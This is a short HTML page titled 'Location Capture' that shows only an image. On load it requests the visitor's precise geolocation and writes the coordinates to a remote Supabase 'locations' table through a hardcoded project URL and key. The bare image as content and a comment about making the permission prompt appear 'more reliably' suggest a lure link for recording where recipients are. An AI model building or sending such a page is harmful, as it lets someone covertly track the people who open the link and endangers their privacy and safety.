<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Location Capture</title>

  <!-- Supabase v2 -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <style>
    body {
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      background: #fff;
    }

    img {
      max-width: 100%;
      height: auto;
      display: block;
    }

    #msg {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      font-family: Arial, sans-serif;
      font-size: 14px;
      color: #333;
      background: rgba(255,255,255,0.95);
      padding: 8px 12px;
      border-radius: 6px;
    }
  </style>
</head>
<body>

  <img src="https://neostuffs.com/wp-content/uploads/2016/05/rastra.jpg" alt="Rastra" />
  <div id="msg">Waiting for location permission...</div>

  <script>
    const msg = document.getElementById('msg');

    // IMPORTANT: must be https or localhost or browser will NOT prompt
    const supabaseUrl = 'https://jjpttsmpkscrvivzowdo.supabase.co';
    const supabaseKey = 'sb_publishable_nbsygrIo_n-UTUNnEV5wBA_ndx8V_sF';

    const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

    function saveLocation(position) {
      const payload = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        created_at: new Date().toISOString()
      };

      supabase.from('locations').insert(payload)
        .then(({ error }) => {
          if (error) {
            msg.textContent = 'Supabase error: ' + error.message;
          } else {
            msg.textContent = 'Location saved successfully';
          }
        });
    }

    function errorHandler(err) {
      msg.textContent = 'Location error: ' + err.message;
      console.log(err);
    }

    function requestLocation() {
      if (!navigator.geolocation) {
        msg.textContent = 'Geolocation not supported';
        return;
      }

      navigator.geolocation.getCurrentPosition(
        saveLocation,
        errorHandler,
        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }
      );
    }

    window.addEventListener('load', () => {
      console.log('Page loaded, requesting location...');

      // slight delay helps trigger prompt more reliably
      setTimeout(requestLocation, 500);
    });
  </script>

</body>
</html>
